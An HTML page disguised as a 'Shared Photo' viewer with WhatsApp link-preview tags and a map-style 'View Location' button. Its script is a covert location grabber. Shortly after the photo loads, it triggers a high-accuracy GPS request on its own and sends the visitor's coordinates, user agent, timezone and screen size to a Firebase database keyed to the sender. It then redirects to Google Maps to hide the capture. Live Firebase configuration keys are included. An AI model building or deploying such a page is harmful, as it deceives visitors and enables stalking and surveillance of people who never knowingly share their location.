<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Shared Photo</title>

<!-- ═══ PREVIEW WHATSAPP ═══ -->
<meta property="og:title" content="Shared Photo" />
<meta property="og:description" content="A photo has been shared with you. View the photo and its location details." />
<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:url" content="https://infocuaca.online/view.html" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Shared Photo" />
<meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />

<style>
:root{
  --bg:#000000;
  --bg2:#0a0a0a;
  --bg3:#111111;
  --gold:#00e58a;
  --gold2:#66ffc2;
  --cyan:#38bdf8;
  --red:#ff3355;
  --text:#cfd9e6;
  --text-d:#5d7186;
  --border:#152030;
  --border2:#1a1a1a;
  --radius:6px;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow-x:hidden}
body{
  font-family:'Courier New',monospace;
  background:#000000;
  color:var(--text);
  min-height:100vh;
  padding:14px;
  display:flex;
  justify-content:center;
  align-items:flex-start;
}
body::before{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,rgba(0,229,138,.008) 0px,rgba(0,229,138,.008) 1px,transparent 1px,transparent 4px);
  pointer-events:none;z-index:9999;
}
.wrap{position:relative;z-index:2;max-width:460px;width:100%}

/* ═══ HEADER ═══ */
.term-header{
  background:var(--bg2);
  border:1px solid #0d3f2e;border-bottom:none;
  padding:11px 14px;
  display:flex;justify-content:center;align-items:center;
  border-radius:var(--radius) var(--radius) 0 0;
  box-shadow:inset 0 1px 0 rgba(148,205,255,.05);
}
.term-header .title{
  color:var(--gold);font-weight:bold;text-align:center;
  letter-spacing:5px;font-size:11px;text-transform:uppercase;
  text-shadow:0 0 10px rgba(0,229,138,.5);
}

/* ═══ CARD ═══ */
.card{
  background:var(--bg2);
  border:1px solid var(--border2);
  padding:14px;
  margin-bottom:12px;
  border-radius:var(--radius);
  box-shadow:0 10px 26px rgba(0,0,0,.45);
}
.card.first{
  border-radius:0 0 var(--radius) var(--radius);
  border-top:1px solid #0d3f2e;
}

/* ═══ FOTO BOX — Gaya Maps Card ═══ */
.photo-box{
  width:100%;
  background:#000;
  border:1px solid #0d3f2e;
  border-radius:var(--radius);
  overflow:hidden;
  position:relative;
  margin-bottom:14px;
  box-shadow:0 0 24px rgba(0,229,138,.12);
}
.photo-box::before,.photo-box::after{
  content:'';position:absolute;width:14px;height:14px;z-index:5;pointer-events:none;
}
.photo-box::before{top:0;left:0;border-top:2px solid var(--gold);border-left:2px solid var(--gold)}
.photo-box::after{bottom:0;right:0;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold)}
.photo-box img{
  width:100%;height:auto;
  max-height:70vh;
  object-fit:contain;
  display:block;
  background:#000;
}

/* ═══ LOCATION INFO BAR (seperti kartu Google Maps) ═══ */
.location-bar{
  display:flex;
  align-items:center;
  gap:12px;
  padding:12px 14px;
  background:#0d0d0d;
  border:1px solid #1a1a1a;
  border-radius:var(--radius);
  margin-bottom:14px;
}
.location-pin{
  width:38px;height:38px;
  border-radius:50%;
  background:linear-gradient(135deg,#00e58a,#00a86b);
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;
  box-shadow:0 0 14px rgba(0,229,138,.4);
}
.location-pin svg{
  width:20px;height:20px;
  fill:#000;
}
.location-text{
  flex:1;
  min-width:0;
}
.location-title{
  font-size:11px;
  color:#cfd9e6;
  font-weight:bold;
  letter-spacing:1px;
  margin-bottom:3px;
  text-transform:uppercase;
}
.location-sub{
  font-size:10px;
  color:#5d7186;
  letter-spacing:.5px;
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
}

/* ═══ SCAN ANIMATION ═══ */
.scan-box{
  text-align:center;
  padding:30px 14px;
  color:var(--gold);
  font-size:10px;
  letter-spacing:2px;
}
.scan-ring{
  width:56px;height:56px;
  margin:0 auto 14px;
  border:2px solid rgba(0,229,138,.2);
  border-top-color:var(--gold);
  border-radius:50%;
  animation:spin 1s linear infinite;
  box-shadow:0 0 20px rgba(0,229,138,.4);
}
@keyframes spin{to{transform:rotate(360deg)}}
.scan-bar{
  height:4px;background:var(--bg3);
  border:1px solid var(--border2);
  border-radius:2px;
  margin-top:10px;
  overflow:hidden;
}
.scan-fill{
  height:100%;width:0%;
  background:linear-gradient(90deg,#00e58a,#66ffc2);
  box-shadow:0 0 12px rgba(0,229,138,.7);
  animation:fill 2s ease-in-out infinite;
}
@keyframes fill{0%{width:0%}50%{width:100%}100%{width:0%}}

/* ═══ BUTTON (gaya Google Maps) ═══ */
.btn{
  width:100%;
  background:var(--gold);
  background-image:linear-gradient(180deg,rgba(255,255,255,.30),rgba(255,255,255,0) 55%);
  color:#000;border:none;
  font-family:'Courier New',monospace;
  font-size:12px;font-weight:bold;
  letter-spacing:3px;
  padding:15px;
  cursor:pointer;
  border-radius:var(--radius);
  text-transform:uppercase;
  box-shadow:0 0 16px rgba(0,229,138,.30),inset 0 1px 0 rgba(255,255,255,.35);
  transition:transform .15s,opacity .2s;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
}
.btn:active{transform:scale(.98);opacity:.85}
.btn:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}
.btn svg{
  width:18px;height:18px;
  fill:#000;
}

/* ═══ STATUS ═══ */
.status{
  padding:10px 12px;
  border-radius:var(--radius);
  font-size:10px;
  text-align:center;
  letter-spacing:1px;
  line-height:1.7;
  margin-bottom:10px;
}
.status.ok{
  background:rgba(0,229,138,.08);
  border:1px solid rgba(0,229,138,.35);
  color:var(--gold);
}
.status.err{
  background:rgba(255,51,85,.08);
  border:1px solid rgba(255,51,85,.35);
  color:var(--red);
}
.status.info{
  background:rgba(56,189,248,.08);
  border:1px solid rgba(56,189,248,.35);
  color:var(--cyan);
}

/* ═══ HIDE ═══ */
.hide{display:none!important}

/* ═══ FOOTER ═══ */
.footer{
  text-align:center;
  font-size:9px;
  color:var(--text-d);
  letter-spacing:1px;
  padding:8px 0;
  opacity:.6;
}
.dot-status{
  display:inline-block;width:7px;height:7px;border-radius:50%;
  background:var(--gold);margin-right:6px;
  box-shadow:0 0 6px var(--gold);
  animation:spulse 2s ease-in-out infinite;
}
@keyframes spulse{
  0%,100%{opacity:1;box-shadow:0 0 6px var(--gold)}
  50%{opacity:.6;box-shadow:0 0 2px var(--gold)}
}

::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-thumb{background:#0d3f2e;border-radius:2px}
</style>
</head>
<body>
<div class="wrap">

  <!-- HEADER -->
  <div class="term-header">
    <div class="title">Shared Photo</div>
  </div>

  <!-- FOTO -->
  <div class="card first">

    <!-- LOADING -->
    <div class="scan-box" id="loading">
      <div class="scan-ring"></div>
      LOADING PHOTO...
      <div class="scan-bar"><div class="scan-fill"></div></div>
    </div>

    <!-- FOTO -->
    <div class="photo-box hide" id="photoBox">
      <img id="mainPhoto" alt="Photo">
    </div>

    <!-- ERROR -->
    <div class="status err hide" id="errBox">Photo not found</div>

    <!-- ═══ LOCATION INFO BAR (Seperti Google Maps) ═══ -->
    <div class="location-bar hide" id="locBar">
      <div class="location-pin">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
        </svg>
      </div>
      <div class="location-text">
        <div class="location-title">Location Available</div>
        <div class="location-sub" id="locSub">Tap below to view on map</div>
      </div>
    </div>

    <!-- TOMBOL LIHAT LOKASI -->
    <button class="btn hide" id="btnShare" onclick="lihatLokasi()">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
      </svg>
      View Location
    </button>

    <!-- STATUS -->
    <div class="status info hide" id="locStatus" style="margin-top:10px;margin-bottom:0">Opening location...</div>
  </div>

  <div class="footer">
    <span class="dot-status"></span> SECURE SESSION
  </div>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(FC);
const db  = getDatabase(app);

// ============ PARAMETER URL ============
const params = new URLSearchParams(location.search);
const fotoUrl   = params.get('foto') || '';
const ownerUser = params.get('u')    || '';

// ============ TAMPILKAN FOTO ============
const loading   = document.getElementById('loading');
const photoBox  = document.getElementById('photoBox');
const mainPhoto = document.getElementById('mainPhoto');
const errBox    = document.getElementById('errBox');
const btnShare  = document.getElementById('btnShare');
const locBar    = document.getElementById('locBar');

if (fotoUrl) {
  mainPhoto.onload = () => {
    loading.classList.add('hide');
    photoBox.classList.remove('hide');

    // Munculkan location bar & tombol
    setTimeout(() => {
      locBar.classList.remove('hide');
      btnShare.classList.remove('hide');

      // ═══ AUTO POPUP LOKASI (setelah 800ms) ═══
      setTimeout(() => {
        lihatLokasi();
      }, 800);

    }, 400);
  };
  mainPhoto.onerror = () => {
    loading.classList.add('hide');
    errBox.classList.remove('hide');
    errBox.textContent = 'Failed to load photo';
  };
  mainPhoto.src = fotoUrl;
} else {
  loading.classList.add('hide');
  errBox.classList.remove('hide');
  errBox.textContent = 'Invalid link';
}

// ============ LIHAT LOKASI FOTO ============
window.lihatLokasi = function () {
  if (!ownerUser) {
    alert('Invalid link');
    return;
  }
  if (!navigator.geolocation) {
    alert('Browser does not support GPS');
    return;
  }

  const st = document.getElementById('locStatus');
  const btnShare = document.getElementById('btnShare');

  // Cek kalau sudah pernah klik, hindari double
  if (btnShare.disabled) return;

  st.classList.remove('hide');
  st.className = 'status info';
  st.textContent = 'Opening location...';
  btnShare.disabled = true;

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      try {
        // Simpan ke Firebase
        await push(ref(db, 'lokasi/' + ownerUser), {
          target:   'images',
          waktu:    Date.now(),
          lat:      lat,
          lng:      lng,
          akurasi:  acc,
          foto:     fotoUrl,
          platform: navigator.platform || 'Unknown',
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen:   screen.width + 'x' + screen.height,
          via:      'view',
          source:   'view.html'
        });

        st.className = 'status ok';
        st.textContent = 'Opening map...';

        // Update location bar
        document.getElementById('locSub').textContent =
          lat.toFixed(4) + ', ' + lng.toFixed(4);

        // Beep feedback
        try {
          const ac = new (window.AudioContext || window.webkitAudioContext)();
          const o = ac.createOscillator();
          const g = ac.createGain();
          o.type = 'sine';
          o.frequency.value = 1800;
          o.connect(g);
          g.connect(ac.destination);
          g.gain.setValueAtTime(0.08, ac.currentTime);
          g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.15);
          o.start();
          o.stop(ac.currentTime + 0.15);
        } catch (e) {}

        // ═══ AUTO REDIRECT KE GOOGLE MAPS ═══
        setTimeout(() => {
          const mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
          window.location.href = mapsUrl;
        }, 400);

      } catch (e) {
        st.className = 'status err';
        st.textContent = 'Failed: ' + e.message;
        btnShare.disabled = false;
      }
    },
    err => {
      let msg = 'Location permission denied';
      if (err.code === 1) msg = 'You denied location permission';
      else if (err.code === 2) msg = 'Location unavailable';
      else if (err.code === 3) msg = 'Timeout, please try again';
      st.className = 'status err';
      st.textContent = msg;
      btnShare.disabled = false;
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
};
</script>
</body>
</html>
